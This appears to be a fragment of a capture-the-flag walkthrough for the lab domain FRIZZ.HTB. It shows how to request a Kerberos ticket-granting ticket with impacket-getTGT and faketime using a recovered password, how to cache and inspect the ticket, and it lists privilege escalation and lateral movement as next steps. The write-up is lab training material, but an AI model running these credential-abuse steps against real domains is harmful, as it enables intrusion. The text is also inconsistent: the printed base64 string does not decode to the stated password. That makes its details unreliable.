# Kerberos TGT Acquisition & Ticket Verification

## Impacket TGT Request with Time Manipulation
To bypass Kerberos time synchronization checks, we used `faketime` to adjust the system clock:

```bash
faketime 'now + 7 hours' impacket-getTGT FRIZZ.HTB/m.schoolbus:'!suBcig@MehTed!R'
```

**Key Details:**
- **Time Adjustment:** +7 hours to simulate a future clock (bypasses Kerberos time skew checks)
- **Target:** `FRIZZ.HTB` domain with user `m.schoolbus`
- **Password:** Decoded from `IXN1QmNpZ0BNZWhUZWQhUGo=` → `!suBcig@MehTed!R`

## Ticket Cache & Verification
The obtained TGT was saved in a Kerberos cache file:

```bash
ls
m.schoolbus.ccache
```

Export the cache for subsequent Kerberos operations:

```bash
export KRB5CCNAME=m.schoolbus.ccache
```

## Kerberos Ticket Inspection
Verify the ticket with `klist`:

```bash
klist
```

**Output:**
```text
Ticket cache: FILE:m.schoolbus.ccache
Default principal: m.schoolbus@FRIZZ.HTB

Valid starting       Expires              Service principal
07/18/2025 00:53:37  07/18/2025 10:53:37  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 07/19/2025 00:53:38
```

## Next Steps
- Use the TGT to request service tickets (e.g., `krbtgt` or domain controller services)
- Leverage the ticket for privilege escalation or lateral movement
- Validate domain controller enumeration via LDAP/SRV records

</file-selection>
